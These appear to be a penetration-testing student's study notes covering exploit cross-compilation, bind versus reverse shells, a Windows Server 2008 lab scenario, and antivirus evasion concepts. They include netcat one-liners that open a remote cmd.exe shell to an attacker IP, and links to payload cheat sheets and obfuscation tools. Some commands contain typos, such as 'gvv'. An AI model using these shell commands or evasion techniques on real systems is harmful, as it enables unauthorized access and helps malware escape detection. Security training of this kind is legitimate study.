## Cross-Compiliation Exploits
- Windows 64bit.
```bash
i686-w64-mingw32-gcc 9303.C -o exploit
```

 - Windows 32bit.
 ```bash
i686-w64-mingw32-gcc 9303.c -o exploit
```
 
- Linux.
 ```bash
gvv -pthread dirty.c -o dity -lcrypt
```

[Exploit-Database's binary exploits on GitLab](https://gitlab.com/exploit-database/exploitdb-bin-sploits)

## Bind Shell VS. Reverse Shell

A **bind shell** is a type of remote shell where the **attacker connects directly to a listener on the target system**, consequently allowing for execution of commands on the target system. A Netcat listener can be setup to execute a specific executable like cmd.exe or /bin/bash when a **client connects to the listener**.

- Bind shell is not the best choice. Most firewalls blocks income network trafiic which limit the usage of bind shells.

- On Attacker
```bash
nc -nv 10.15.25.21 1337 
```

- On Victim
```powershell
nc -lvnp 1337 -e cmd.exe
```

- A **reverse shell** is a type of remote shell where the **target connects directly to a listener on the attacker’s system**, consequently allowing for execution of commands on the target system.

- On Attacker
```bash
nc -lnvp 1337 
```

- On Victim
```powershell
nc -nv 10.14.42.2 1337 -e cmd.exe
```

- [Reverse Shell Cheat Sheet - PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Bind Shell Cheatsheet - PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md)

## Windows Black Box Penetration Test 

The following diagram outlines the various phases involved in a typical penetration test. 
### Black Box Methodology: 
+ Host discovery 
+ Port scanning & enumeration 
+ Vulnerability detection/scanning 
+ Exploitation 
	+ Manual 
	- Automated 
- Post Exploitation 
	+ Privilege Escalation 
	+ Persistence  
	+ Dumping Hashes

### Scenario & Scope 

+ You have just begun your first job as a Junior Penetration Tester and have been assigned to assist in performing a penetration test on a client’s network. 

+ The pentest lead has assigned you to gain access/exploit a host running Windows Server 2008. + Your primary objectives are: 
	+ Identify services running on the target 
	+ Identify vulnerabilities within the services 
	+ Exploit these vulnerabilities to obtain an initial foothold

## MySQL Exploit

- When gaining access you can modify PHPMyAdmin configuration file to allow anyone to access it.

![[Pasted image 20230711032239.png]]
```powershell
C:\wamp\alias>net stop wampapache 
C:\wamp\alias>net start wampapache 
```

## AV Evasion & Obfuscation

> *Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. **MITRE***

AV software will typically utilize signature, heuristic and behaviour based detection: 

1. Signature based detection - An AV signature is a unique sequence of bytes that uniquely identifies malware. As a result, you will have to ensure that your obfuscated exploit or payload doesn't match any known signature in the AV database.  We can bypass signature-based detection by modifying the malware's byte sequence, therefore changing the signature.

2. Heuristic-based detection - Relies on rules or decisions to determine whether a binary is malicious. It also looks for specific patterns within the code or program calls. 

3. Behavior based detection - Relies on identifying malware by monitoring it's behavior. (Used for newer strains of malware) .

### On-disk Evasion Techniques 

* Obfuscation - Obfuscation refers to the process of concealing something important, valuable, or critical. Obfuscation recrganizes code in order to make it harder to analyze or RE. 

* Encoding - Encoding data is a process involving changing data into a new format using a scheme. Encoding is a reversible process; data can be encoded to a new format and decoded to its original format. 

* Packing - Generate executable with new binary structure with a smaller size and therefore provides the payload with a new signature. 

* Crypters - Encrypts code or payloads and decrypts the encrypted code in memory. The decryption key/function is usually stored in a stub. 

### In-Memory Evasion Techniques 

+ Focuses on manipulation of memory and does not write files to disk. 
+ Injects payload into a process by leveraging various Windows APIs. 
+ Payload is then executed in memory in a separate thread.

## [Shellter](https://www.shellterproject.com/introducing-shellter/)

Shellter is a dynamic shellcode injection tool, and the first truly dynamic PE infector ever created.  
It can be used in order to inject shellcode into native Windows applications (currently 32-bit applications only).  
The shellcode can be something yours or something generated through a framework, such as Metasploit.

## Obfuscation PowerShell Code

+ Obfuscation refers to the process of concealing something important, valuable, or critical. 
+ Obfuscation reorganizes code in order to make it harder to analyze or RE. 
+ As a penetration tester, you will find yourself working with PowerShell code frequently. 
+ Most AV solutions will immediately flag malicious PowerShell code, as a result, you must be able to obfuscate/encode your PowerShell code and scripts in order to avoid detection.
+ **[Invoke-Obfuscation Tool On GitHub](https://github.com/danielbohannon/Invoke-Obfuscation)**
